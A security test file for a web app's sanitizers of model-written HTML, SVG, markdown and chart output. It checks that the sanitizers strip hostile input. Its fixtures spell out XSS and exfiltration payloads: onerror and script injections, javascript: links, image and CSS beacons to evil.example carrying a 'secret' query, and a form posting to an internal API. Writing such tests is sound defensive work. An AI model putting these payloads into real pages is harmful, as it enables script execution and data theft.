// @vitest-environment jsdom
// What model- or corpus-written output can do in the page. The API is unauthenticated and answers the page's own
// origin, so markup a model wrote must never run script in the page, submit a form to it, restyle it, or make the
// browser load anything from another host (src/lib/sanitize.ts, src/lib/svg.ts, src/lib/vegaLoader.ts,
// src/components/MdImage.tsx and the sandboxed frames). The real components render under jsdom; the frames' isolation
// itself is the browser's, so here it is checked through the attributes the page gives them.
import { readdirSync, readFileSync, statSync } from 'node:fs'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest'
import { Output } from '../../src/components/Outputs.tsx'
import { ChatMarkdown } from '../../src/chat/markdown.tsx'
import { isLocalUrl, purifyHtml, purifySvg, styleReachesOut } from '../../src/lib/sanitize.ts'
import { inlineSvg, rootDecls } from '../../src/lib/svg.ts'
import { dataOnly, withoutEmbedOptions } from '../../src/lib/vegaLoader.ts'
import { parseInline } from '../../src/report/inlineParse.ts'
import { mount, settle, unmountAll } from './mount.tsx'

const SRC = path.resolve(__dirname, '../../src')
const fetched: string[] = []

beforeEach(() => {
  // nothing a test renders may fetch; a request is recorded and refused
  vi.stubGlobal('fetch', async (url: unknown) => {
    fetched.push(String(url))
    throw new Error('no network in tests')
  })
})
afterEach(() => {
  unmountAll()
  vi.unstubAllGlobals()
  expect(fetched.filter((u) => u.includes('evil.example'))).toEqual([])
  fetched.length = 0
})

const html = (el: Element) => el.innerHTML

describe('html output', () => {
  test('html with script runs in a frame sandboxed to scripts alone, never inlined in the page', async () => {
    const el = await mount(<Output bundle={{ 'text/html': '<p>probe</p><script>parent.__pwned = 1</script>' }} />)
    await settle()
    const frame = el.querySelector('iframe')
    expect(frame).not.toBeNull()
    expect(frame!.getAttribute('sandbox')).toBe('allow-scripts')
    expect(el.querySelector('script')).toBeNull()
    expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
  })

  test('inlined html keeps its table and loses script, event handlers, style, forms and remote URLs', async () => {
    const markup = [
      '<table><thead><tr><th></th><th>n</th></tr></thead><tbody><tr><th>a</th><td>1</td></tr></tbody></table>',
      '<img id="onerr" src="x" onerror="window.__pwned = 1">',
      '<style>body { display: none }</style>',
      '<link rel="stylesheet" href="https://evil.example/a.css">',
      '<form action="/api/dev/revert" method="post"><button id="go">Go</button><input name="a"></form>',
      '<img id="leak" src="https://evil.example/leak.png?d=secret">',
      '<img id="srcset" src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/2x.png 2x">',
      '<div id="bg" style="background: url(https://evil.example/bg.png)">bg</div>',
      '<div id="kept-style" style="color: red">kept</div>',
      '<a id="js" href="javascript:window.__pwned = 2">j</a>',
      '<a id="ext" href="https://example.org/">ext</a>',
      '<svg><foreignObject><img src="x" onerror="window.__pwned = 3"></foreignObject></svg>',
      '<img id="local" src="data:image/png;base64,iVBORw0KGgo=">',
      '<iframe src="https://evil.example/"></iframe>',
    ].join('')
    const el = await mount(<Output bundle={{ 'text/html': markup }} />)
    const out = html(el)
    expect(el.querySelector('table td')?.textContent).toBe('1')
    expect(out).not.toMatch(/onerror|<style|<link|<form|<button|<input|<iframe|javascript:|evil\.example/i)
    expect(el.querySelector('#leak')?.getAttribute('src')).toBeNull()
    expect(el.querySelector('#srcset')?.hasAttribute('srcset')).toBe(false)
    expect(el.querySelector('#bg')?.getAttribute('style')).toBeNull()
    expect(el.querySelector('#kept-style')?.getAttribute('style')).toBe('color: red')
    expect(el.querySelector('#local')?.getAttribute('src')).toMatch(/^data:image\/png/)
    const ext = el.querySelector('#ext')
    expect([ext?.getAttribute('target'), ext?.getAttribute('rel')]).toEqual(['_blank', 'noreferrer noopener'])
    expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
  })

  test('purifyHtml drops what would leave the page and keeps what stays on the machine', () => {
    const origin = window.location.origin
    const out = purifyHtml(`<img src="/api/ws/a/media/x.png"><img src="${origin}/api/x.png"><img src="//evil.example/x.png"><a href="#note" ping="https://evil.example/p">n</a>`)
    expect(out).toContain('src="/api/ws/a/media/x.png"')
    expect(out).toContain(`src="${origin}/api/x.png"`)
    expect(out).not.toContain('evil.example')
    expect(out).not.toContain('ping')
  })
})

describe('svg output', () => {
  const svg = `<?xml version="1.0" encoding="utf-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100pt" height="50pt" viewBox="0 0 100 50">
 <defs><style type="text/css">*{stroke-linejoin: round; stroke-linecap: butt} body { display: none }</style></defs>
 <div xmlns="http://www.w3.org/1999/xhtml"><form action="javascript:window.__pwned = 4"><button id="svgbtn">b</button></form></div>
 <script>window.__pwned = 5</script>
 <g id="figure_1" onclick="window.__pwned = 6"><path id="p1" d="M 0 0 L 10 10" style="stroke: #000000"/></g>
 <foreignObject><div xmlns="http://www.w3.org/1999/xhtml">html</div></foreignObject>
 <a xlink:href="https://evil.example/"><text>link</text></a>
 <image xlink:href="https://evil.example/svg.png" width="5" height="5"/>
 <image id="embedded" xlink:href="data:image/png;base64,iVBORw0KGgo=" width="5" height="5"/>
</svg>`

  test('an svg figure keeps its drawing and loses script, style, html, links and remote images', async () => {
    const el = await mount(<Output bundle={{ 'image/svg+xml': svg }} />)
    const root = el.querySelector('svg')
    expect(root).not.toBeNull()
    expect(el.querySelector('path')).not.toBeNull()
    expect(html(el)).not.toMatch(/<style|<script|<form|<button|<div xmlns|foreignObject|onclick|evil\.example/i)
    const images = Array.from(el.querySelectorAll('image')).map((i) => i.getAttribute('href') ?? i.getAttribute('xlink:href') ?? '')
    expect(images.filter(Boolean).map((h) => h.slice(0, 10))).toEqual(['data:image'])
    expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
  })

  test("the figure's star rule moves onto its root as inline style, and nothing else of the sheet does", () => {
    const fig = inlineSvg(svg, 'f1-')
    expect(fig).not.toBeNull()
    expect(fig!.markup).toMatch(/stroke-linejoin: round; stroke-linecap: butt/)
    expect(fig!.markup).not.toMatch(/display: none/)
    expect(rootDecls('*{stroke-linejoin: round; stroke-linecap: butt}')).toBe('stroke-linejoin: round; stroke-linecap: butt')
    expect(rootDecls('* { position: fixed; stroke: url(https://e/x); fill: #fff } svg { stroke: red }')).toBe('fill: #fff')
  })

  test('purifySvg keeps SVG elements only', () => {
    const out = purifySvg('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/><foreignObject><p>x</p></foreignObject><a href="https://evil.example/"><text>t</text></a></svg>')
    expect(out).toContain('<circle')
    expect(out).not.toMatch(/foreignObject|<p>|<a |evil\.example/)
  })
})

describe('markdown', () => {
  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media/a.png)'

  test('a markdown image from another host is drawn as its alt text, in an output and in the chat', async () => {
    for (const node of [<Output bundle={{ 'text/markdown': md }} />, <ChatMarkdown text={md} />]) {
      const el = await mount(node)
      const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
      expect(srcs).toEqual(['/api/ws/w/media/a.png'])
      expect(el.textContent).toContain('leak')
    }
  })

  test('raw html in chat markdown is shown as text, never parsed', async () => {
    const el = await mount(<ChatMarkdown text={'<img src=x onerror="window.__pwned = 7"> <script>window.__pwned = 8</script>'} />)
    expect(el.querySelector('img, script')).toBeNull()
    expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
  })
})

describe('the pure checks', () => {
  test('isLocalUrl: data: URLs, fragments and the page origin stay; any other host or scheme does not', () => {
    const o = 'http://127.0.0.1:8300'
    for (const u of ['data:image/png;base64,AA', '#clip', '/api/x', 'img/a.png', `${o}/api/x`, `blob:${o}/1234`]) expect(isLocalUrl(u, o), u).toBe(true)
    for (const u of ['https://evil.example/a.png', '//evil.example/a.png', 'http://127.0.0.1:8301/a', 'javascript:alert(1)', '', '   ']) expect(isLocalUrl(u, o), u).toBe(false)
  })

  test('styleReachesOut: a url() to another host, image-set(), @import and expression() reach out', () => {
    const o = 'http://127.0.0.1:8300'
    expect(styleReachesOut('clip-path: url(#p1); fill: red', o)).toBe(false)
    expect(styleReachesOut('background: url("https://evil.example/x")', o)).toBe(true)
    expect(styleReachesOut("background: url('/api/x.png')", o)).toBe(false)
    expect(styleReachesOut('background-image: image-set("x.png" 1x)', o)).toBe(true)
    expect(styleReachesOut('@import "x.css"', o)).toBe(true)
  })

  test("Vega's loader fetches no URL but a data: one, and a spec cannot hand it embed options of its own", async () => {
    const base = { options: {}, sanitize: async (uri: string) => ({ href: uri }) }
    const safe = dataOnly(base)
    await expect(safe.sanitize('data:text/csv,a')).resolves.toEqual({ href: 'data:text/csv,a' })
    await expect(safe.sanitize('https://evil.example/d.json')).rejects.toThrow(/loads no URL/)
    await expect(safe.sanitize('/api/ws/w/data.json')).rejects.toThrow(/loads no URL/)
    expect(withoutEmbedOptions({ mark: 'bar', usermeta: { embedOptions: { loader: {} }, note: 1 } })).toEqual({ mark: 'bar', usermeta: { note: 1 } })
    const plain = { mark: 'bar' }
    expect(withoutEmbedOptions(plain)).toBe(plain)
  })

  test("a report sentence's link keeps http:, https: and mailto: only; any other scheme stays text", () => {
    const links = (t: string) => parseInline(t).filter((n) => n.kind === 'link')
    for (const href of ['https://example.org/a', 'http://example.org/', 'mailto:someone@example.org']) expect(links(`see [x](${href})`), href).toEqual([{ kind: 'link', href, children: [{ kind: 'text', text: 'x' }] }])
    for (const href of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,x', 'vbscript:x', 'file:///etc/passwd', '/api/x']) {
      expect(links(`see [x](${href})`), href).toEqual([])
      expect(parseInline(`see [x](${href})`), href).toEqual([{ kind: 'text', text: `see [x](${href})` }])
    }
  })
})

/** Every source file under src. */
function sources(dir = SRC): string[] {
  return readdirSync(dir).flatMap((n) => {
    const p = path.join(dir, n)
    return statSync(p).isDirectory() ? sources(p) : /\.(tsx?|mjs)$/.test(n) ? [p] : []
  })
}

describe('the source', () => {
  test('no frame runs script with the page origin, and raw HTML reaches the page only through the sanitizer', () => {
    const sinks: string[] = []
    for (const f of sources()) {
      const text = readFileSync(f, 'utf8')
      for (const m of text.matchAll(/sandbox="([^"]*)"/g)) {
        const tokens = m[1].split(/\s+/)
        expect(tokens.includes('allow-scripts') && tokens.includes('allow-same-origin'), `${f}: ${m[0]}`).toBe(false)
        expect(tokens.includes('allow-top-navigation') || tokens.includes('allow-popups-to-escape-sandbox'), `${f}: ${m[0]}`).toBe(false)
      }
      if (/dangerouslySetInnerHTML|\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write/.test(text)) sinks.push(path.relative(SRC, f))
    }
    // Outputs inlines html through purifyHtml and svg through inlineSvg, which ends in purifySvg. A new sink needs the
    // same review, and then a line here.
    expect(sinks).toEqual(['components/Outputs.tsx'])
    expect(readFileSync(path.join(SRC, 'components/Outputs.tsx'), 'utf8')).toMatch(/purifyHtml\(html\)/)
    expect(readFileSync(path.join(SRC, 'lib/svg.ts'), 'utf8')).toMatch(/purifySvg\(new XMLSerializer\(\)\.serializeToString\(svg\)\)/)
  })

  test('every react-markdown renderer draws images through MdImage', () => {
    const users = sources().filter((f) => /from 'react-markdown'/.test(readFileSync(f, 'utf8')) && /<(?:ReactMarkdown|Markdown)\b/.test(readFileSync(f, 'utf8')))
    expect(users.length).toBeGreaterThan(0)
    for (const f of users) expect(readFileSync(f, 'utf8'), path.relative(SRC, f)).toMatch(/img: MdImage/)
  })
})
